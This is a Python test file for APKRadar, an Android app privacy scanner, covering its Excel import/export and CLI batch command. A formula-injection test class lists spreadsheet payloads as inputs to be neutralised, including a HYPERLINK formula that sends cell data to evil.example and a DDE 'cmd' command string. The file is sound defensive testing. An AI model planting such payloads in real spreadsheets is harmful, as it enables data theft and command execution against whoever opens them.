"""Tests for APKRadar Excel module."""
import os
import tempfile
import unittest
from apkradar.scanner import ScanResult, TrackerFound, PermissionFound, TransferFound
from apkradar.excel import read_apk_list, write_results, ExcelRow


def _make_result(package="com.example.app", score_label="POOR"):
    result = ScanResult(
        apk_path="test.apk",
        package_name=package,
        app_name="Test App",
        version_name="1.0",
        version_code="1",
        sha256="abc123" * 11,
        apk_format="apk",
    )
    result.trackers = [
        TrackerFound(package="com.google.firebase", name="Firebase Analytics")
    ]
    result.sensitive_permissions = [
        PermissionFound(
            permission="android.permission.ACCESS_FINE_LOCATION",
            description="precise GPS location",
        )
    ]
    result.extra_eu_transfers = [
        TransferFound(package_prefix="com.google", entity="Google LLC (USA)")
    ]
    return result


def _make_xlsx(data: list[dict]) -> str:
    """Create a temp Excel file with given data."""
    import openpyxl
    wb = openpyxl.Workbook()
    ws = wb.active
    if data:
        headers = list(data[0].keys())
        for col_idx, header in enumerate(headers, 1):
            ws.cell(row=1, column=col_idx, value=header)
        for row_idx, row in enumerate(data, 2):
            for col_idx, value in enumerate(row.values(), 1):
                ws.cell(row=row_idx, column=col_idx, value=value)
    with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
        tmp = f.name
    wb.save(tmp)
    return tmp


class TestReadApkList(unittest.TestCase):

    def test_read_package_name_column(self):
        tmp = _make_xlsx([
            {"App Name": "Test App", "Package Name": "com.example.app"},
            {"App Name": "Another App", "Package Name": "com.another.app"},
        ])
        try:
            rows = read_apk_list(tmp)
            self.assertEqual(len(rows), 2)
            self.assertEqual(rows[0].package_name, "com.example.app")
            self.assertEqual(rows[0].app_name, "Test App")
            self.assertEqual(rows[1].package_name, "com.another.app")
        finally:
            os.unlink(tmp)

    def test_read_apk_path_column(self):
        tmp = _make_xlsx([
            {"App Name": "Test App", "APK Path": "/path/to/app.apk"},
        ])
        try:
            rows = read_apk_list(tmp)
            self.assertEqual(len(rows), 1)
            self.assertEqual(rows[0].apk_path, "/path/to/app.apk")
        finally:
            os.unlink(tmp)

    def test_read_empty_rows_skipped(self):
        tmp = _make_xlsx([
            {"Package Name": "com.example.app"},
            {"Package Name": ""},
            {"Package Name": "com.another.app"},
        ])
        try:
            rows = read_apk_list(tmp)
            self.assertEqual(len(rows), 2)
        finally:
            os.unlink(tmp)

    def test_read_row_numbers(self):
        tmp = _make_xlsx([
            {"Package Name": "com.example.app"},
            {"Package Name": "com.another.app"},
        ])
        try:
            rows = read_apk_list(tmp)
            self.assertEqual(rows[0].row_number, 2)
            self.assertEqual(rows[1].row_number, 3)
        finally:
            os.unlink(tmp)


class TestWriteResults(unittest.TestCase):

    def test_write_creates_file(self):
        results = [_make_result()]
        with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
            tmp = f.name
        os.unlink(tmp)
        try:
            write_results(results, tmp)
            self.assertTrue(os.path.exists(tmp))
        finally:
            if os.path.exists(tmp):
                os.unlink(tmp)

    def test_write_multiple_results(self):
        import openpyxl
        results = [
            _make_result("com.app1"),
            _make_result("com.app2"),
            _make_result("com.app3"),
        ]
        with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
            tmp = f.name
        os.unlink(tmp)
        try:
            write_results(results, tmp)
            wb = openpyxl.load_workbook(tmp)
            ws = wb.active
            self.assertEqual(ws.max_row, 4)  # 1 header + 3 data rows
        finally:
            if os.path.exists(tmp):
                os.unlink(tmp)

    def test_write_augment_mode(self):
        import openpyxl
        input_tmp = _make_xlsx([
            {"App Name": "Test App", "Package Name": "com.example.app"},
        ])
        with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
            output_tmp = f.name
        os.unlink(output_tmp)
        try:
            results = [_make_result()]
            write_results(results, output_tmp, input_path=input_tmp)
            wb = openpyxl.load_workbook(output_tmp)
            ws = wb.active
            self.assertGreater(ws.max_column, 2)
        finally:
            os.unlink(input_tmp)
            if os.path.exists(output_tmp):
                os.unlink(output_tmp)


class TestSkippedRows(unittest.TestCase):
    """Rows with only a package name are reported as skipped."""

    def setUp(self):
        from typer.testing import CliRunner
        self.runner = CliRunner()

    def _run(self, rows, scan_results=()):
        import tempfile, os
        from unittest.mock import patch
        from apkradar.cli import app
        with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
            tmp = f.name
        self.addCleanup(os.unlink, tmp)
        with patch("apkradar.excel.read_apk_list", return_value=rows), \
             patch("apkradar.scanner.scan", side_effect=list(scan_results)), \
             patch("apkradar.excel.write_results") as mock_write:
            result = self.runner.invoke(app, ["batch-excel", tmp, "--output", tmp + ".out.xlsx"])
        return result, mock_write

    @staticmethod
    def _row(package_name="com.example.app", apk_path=""):
        return ExcelRow(row_number=2, app_name="", package_name=package_name, apk_path=apk_path)

    def test_package_only_exits_0(self):
        result, _ = self._run([self._row()])
        self.assertEqual(result.exit_code, 0)

    def test_package_only_reported_as_skipped(self):
        result, _ = self._run([self._row()])
        self.assertIn("skipped", result.output.lower())
        self.assertIn("no APK path", result.output)

    def test_package_only_not_graded(self):
        result, _ = self._run([self._row()])
        self.assertNotIn("CRITICAL", result.output)
        self.assertNotIn("GOOD", result.output)
        self.assertNotIn("0/100", result.output)

    def test_report_still_written(self):
        _, mock_write = self._run([self._row()])
        mock_write.assert_called_once()
        results = mock_write.call_args.kwargs["results"]
        self.assertTrue(results[0].skipped)

    def test_failed_scan_alongside_skipped_exits_1(self):
        rows = [self._row(), self._row(package_name="com.other.app", apk_path="missing.apk")]
        failed = ScanResult(apk_path="missing.apk", error="File not found: missing.apk")
        result, _ = self._run(rows, scan_results=[failed])
        self.assertEqual(result.exit_code, 1)

    def test_skipped_row_written_to_excel(self):
        import openpyxl, tempfile, os
        with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
            out = f.name
        os.unlink(out)
        self.addCleanup(lambda: os.path.exists(out) and os.unlink(out))
        result = ScanResult(apk_path="com.example.app", package_name="com.example.app", skipped=True)
        write_results([result], out)
        ws = openpyxl.load_workbook(out).active
        self.assertEqual(ws["F2"].value, "SKIPPED")   # Grade
        self.assertIn(ws["E2"].value, (None, ""))     # Score left empty


class TestFormulaInjection(unittest.TestCase):
    """Untrusted strings from APKs must never become Excel formulas."""

    PAYLOADS = [
        '=HYPERLINK("https://evil.example/?"&A1,"Click")',
        "+cmd|' /C calc'!A0",
        "-1+1",
        "@SUM(1+1)",
    ]

    def _write(self, results, input_path=None):
        import openpyxl
        with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
            out = f.name
        os.unlink(out)
        self.addCleanup(lambda: os.path.exists(out) and os.unlink(out))
        write_results(results, out, input_path=input_path)
        return out, openpyxl.load_workbook(out).active

    def _assert_text_cell(self, cell, expected):
        self.assertEqual(cell.value, expected)
        self.assertEqual(cell.data_type, "s")
        self.assertTrue(cell.quotePrefix, f"quotePrefix not set for {expected!r}")

    def _assert_no_formulas(self, path):
        import zipfile
        with zipfile.ZipFile(path) as z:
            sheets = [n for n in z.namelist() if n.startswith("xl/worksheets/sheet")]
            for name in sheets:
                self.assertNotIn("<f>", z.read(name).decode())

    def test_app_name_payloads_written_as_text(self):
        results = [
            ScanResult(apk_path="a.apk", package_name="com.example.app", app_name=p)
            for p in self.PAYLOADS
        ]
        out, ws = self._write(results)
        self._assert_no_formulas(out)
        for row_idx, payload in enumerate(self.PAYLOADS, 2):
            self._assert_text_cell(ws.cell(row=row_idx, column=1), payload)

    def test_hyperlink_written_as_text(self):
        payload = self.PAYLOADS[0]
        out, ws = self._write([ScanResult(apk_path="a.apk", app_name=payload)])
        self._assert_no_formulas(out)
        self._assert_text_cell(ws["A2"], payload)

    def test_plus_cmd_written_as_text(self):
        _, ws = self._write([ScanResult(apk_path="a.apk", app_name="+cmd")])
        self._assert_text_cell(ws["A2"], "+cmd")

    def test_minus_expression_written_as_text(self):
        _, ws = self._write([ScanResult(apk_path="a.apk", app_name="-1+1")])
        self._assert_text_cell(ws["A2"], "-1+1")

    def test_all_string_columns_protected(self):
        result = ScanResult(
            apk_path="a.apk",
            package_name="=pkg()",
            app_name="",
            version_name="=version()",
        )
        result.trackers = [TrackerFound(package="com.x", name="=tracker()")]
        out, ws = self._write([result])
        self._assert_no_formulas(out)
        self._assert_text_cell(ws["A2"], "=pkg()")   # app_name falls back to package
        self._assert_text_cell(ws["B2"], "=pkg()")
        self._assert_text_cell(ws["D2"], "=version()")
        self._assert_text_cell(ws["J2"], "=tracker()")

    def test_augment_mode_protected(self):
        input_tmp = _make_xlsx([{"Package Name": "com.example.app"}])
        self.addCleanup(os.unlink, input_tmp)
        result = ScanResult(apk_path="a.apk", package_name="com.example.app")
        result.trackers = [TrackerFound(package="com.x", name="=tracker()")]
        out, ws = self._write([result], input_path=input_tmp)
        self._assert_no_formulas(out)
        self._assert_text_cell(ws.cell(row=2, column=7), "=tracker()")

    def test_safe_values_unchanged(self):
        result = _make_result()
        _, ws = self._write([result])
        self.assertEqual(ws["A2"].value, "Test App")
        self.assertFalse(ws["A2"].quotePrefix)
        self.assertEqual(ws["E2"].value, result.score)
        self.assertEqual(ws["E2"].data_type, "n")


class TestExcelRow(unittest.TestCase):

    def test_excel_row_defaults(self):
        row = ExcelRow(
            row_number=2,
            app_name="Test",
            package_name="com.test.app",
            apk_path="",
        )
        self.assertEqual(row.row_number, 2)
        self.assertEqual(row.package_name, "com.test.app")
        self.assertEqual(row.apk_path, "")


if __name__ == "__main__":
    unittest.main()


class TestBatchExcelCommand(unittest.TestCase):

    def setUp(self):
        from typer.testing import CliRunner
        self.runner = CliRunner()

    def test_batch_excel_help(self):
        from apkradar.cli import app
        result = self.runner.invoke(app, ["batch-excel", "--help"])
        self.assertEqual(result.exit_code, 0)

    def test_batch_excel_missing_file(self):
        from apkradar.cli import app
        result = self.runner.invoke(app, ["batch-excel", "nonexistent.xlsx"])
        self.assertNotEqual(result.exit_code, 0)

    def test_batch_excel_empty_file(self):
        import openpyxl, tempfile, os
        from apkradar.cli import app
        wb = openpyxl.Workbook()
        ws = wb.active
        ws.cell(row=1, column=1, value="Package Name")
        with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
            tmp = f.name
        wb.save(tmp)
        try:
            result = self.runner.invoke(app, ["batch-excel", tmp])
            self.assertEqual(result.exit_code, 0)
            self.assertIn("No APKs found", result.output)
        finally:
            os.unlink(tmp)

    def test_batch_excel_with_package_name(self):
        import openpyxl, tempfile, os
        from apkradar.cli import app
        from unittest.mock import patch
        from apkradar.scanner import ScanResult
        wb = openpyxl.Workbook()
        ws = wb.active
        ws.cell(row=1, column=1, value="Package Name")
        ws.cell(row=2, column=1, value="com.example.app")
        with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
            tmp_in = f.name
        with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
            tmp_out = f.name
        wb.save(tmp_in)
        os.unlink(tmp_out)
        try:
            mock_result = ScanResult(apk_path="com.example.app", package_name="com.example.app")
            with patch("apkradar.excel.read_apk_list") as mock_read:
                from apkradar.excel import ExcelRow
                mock_read.return_value = [ExcelRow(
                    row_number=2,
                    app_name="Example",
                    package_name="com.example.app",
                    apk_path="",
                )]
                with patch("apkradar.excel.write_results") as mock_write:
                    result = self.runner.invoke(app, ["batch-excel", tmp_in, "--output", tmp_out])
                    # Package-only rows are skipped, not a failure
                    self.assertEqual(result.exit_code, 0)
                    mock_write.assert_called_once()
        finally:
            os.unlink(tmp_in)
            if os.path.exists(tmp_out):
                os.unlink(tmp_out)

    def _run_batch_excel(self, scan_results):
        import openpyxl, tempfile, os
        from unittest.mock import patch
        from apkradar.cli import app
        from apkradar.excel import ExcelRow
        rows = [
            ExcelRow(row_number=i + 2, app_name="", package_name="", apk_path=r.apk_path)
            for i, r in enumerate(scan_results)
        ]
        with tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False) as f:
            tmp_in = f.name
        tmp_out = tmp_in.replace(".xlsx", "_out.xlsx")
        try:
            with patch("apkradar.excel.read_apk_list", return_value=rows), \
                 patch("apkradar.scanner.scan", side_effect=scan_results) as mock_scan, \
                 patch("apkradar.excel.write_results") as mock_write:
                result = self.runner.invoke(app, ["batch-excel", tmp_in, "--output", tmp_out])
            return result, mock_scan, mock_write
        finally:
            os.unlink(tmp_in)

    def test_batch_excel_failed_scan_exit_1_report_still_written(self):
        from apkradar.scanner import ScanResult
        bad = ScanResult(apk_path="missing.apk", error="File not found: missing.apk")
        ok = ScanResult(apk_path="ok.apk", package_name="com.example.app")
        result, mock_scan, mock_write = self._run_batch_excel([bad, ok])
        self.assertEqual(mock_scan.call_count, 2)
        mock_write.assert_called_once()
        self.assertEqual(result.exit_code, 1)
        self.assertIn("🔴 CRITICAL — 0/100", result.output)

    def test_batch_excel_all_ok_exit_0(self):
        from apkradar.scanner import ScanResult
        ok = ScanResult(apk_path="ok.apk", package_name="com.example.app")
        result, _, mock_write = self._run_batch_excel([ok])
        mock_write.assert_called_once()
        self.assertEqual(result.exit_code, 0)


class TestDefaultOutputPath(unittest.TestCase):
    """Without --output, the report goes next to the input as <stem>_report.xlsx."""

    def setUp(self):
        from typer.testing import CliRunner
        self.runner = CliRunner()

    def _output_path(self, input_path, *extra):
        from unittest.mock import patch
        from apkradar.cli import app
        rows = [ExcelRow(row_number=2, app_name="", package_name="com.example.app", apk_path="")]
        with patch("apkradar.excel.read_apk_list", return_value=rows), \
             patch("apkradar.excel.write_results") as mock_write:
            result = self.runner.invoke(app, ["batch-excel", input_path, *extra])
        self.assertEqual(result.exit_code, 0, result.output)
        return mock_write.call_args.kwargs["output_path"]

    def test_xlsx_input(self):
        self.assertEqual(self._output_path("registro.xlsx"), "registro_report.xlsx")

    def test_xls_input(self):
        self.assertEqual(self._output_path("registro.xls"), "registro_report.xlsx")

    def test_uppercase_extension(self):
        self.assertEqual(self._output_path("REGISTRO.XLSX"), "REGISTRO_report.xlsx")

    def test_directory_name_untouched(self):
        path = os.path.join("exports.xlsx.d", "registro.xlsx")
        expected = os.path.join("exports.xlsx.d", "registro_report.xlsx")
        self.assertEqual(self._output_path(path), expected)

    def test_explicit_output_wins(self):
        self.assertEqual(self._output_path("registro.xlsx", "--output", "out.xlsx"), "out.xlsx")

    def test_augment_writes_to_input(self):
        self.assertEqual(self._output_path("registro.xlsx", "--augment"), "registro.xlsx")
